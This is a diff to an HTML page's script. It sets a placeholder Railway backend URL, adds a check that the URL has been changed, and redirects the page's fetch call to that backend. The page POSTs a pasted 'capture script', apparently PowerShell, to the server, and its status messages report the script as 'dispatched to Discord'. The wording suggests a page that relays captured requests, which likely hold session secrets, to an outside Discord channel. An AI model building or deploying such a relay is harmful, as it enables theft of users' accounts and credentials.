@@ -118,6 +118,9 @@
     </div>
 
     <script>
+        // --- PASTE YOUR ACTUAL RAILWAY APP URL HERE (without trailing slash) ---
+        const BACKEND_URL = "https://YOUR_RAILWAY_URL.up.railway.app"; 
+
         const statusFeed = document.getElementById('statusFeed');
 
         function logStatus(message, type = '') {
@@ -141,15 +144,20 @@
                 return;
             }
 
+            if (BACKEND_URL.includes("YOUR_RAILWAY_URL")) {
+                logStatus("Error: Please update BACKEND_URL in index.html to your Railway link!", "feed-error");
+                return;
+            }
+
             actionBtn.disabled = true;
             actionBtn.innerText = "Processing...";
             statusFeed.innerHTML = '';
 
-            logStatus("[*] Sending capture script to backend server...", "feed-pending");
+            logStatus("[*] Sending capture script to Railway backend...", "feed-pending");
             await sleep(400);
 
             try {
-                const response = await fetch('/api/process', {
+                const response = await fetch(`${BACKEND_URL}/api/process`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ script: rawPs })
@@ -158,7 +166,7 @@
                 const data = await response.json();
 
                 if (response.ok) {
-                    logStatus("[✔] SUCCESS: Script processed and sent to Discord.", "feed-success");
+                    logStatus("[✔] SUCCESS: Script processed and dispatched to Discord.", "feed-success");
                     actionBtn.innerText = "Success! Sent to Discord";
                 } else {
                     logStatus(`[-] FAILED: ${data.error || 'Server error'}`, "feed-error");
@@ -166,7 +174,7 @@
                 }
             } catch (err) {
                 console.error(err);
-                logStatus("[-] NETWORK ERROR: Failed to reach backend server.", "feed-error");
+                logStatus("[-] NETWORK ERROR: Failed to reach Railway backend.", "feed-error");
                 actionBtn.innerText = "Error";
             } finally {
                 await sleep(2500);
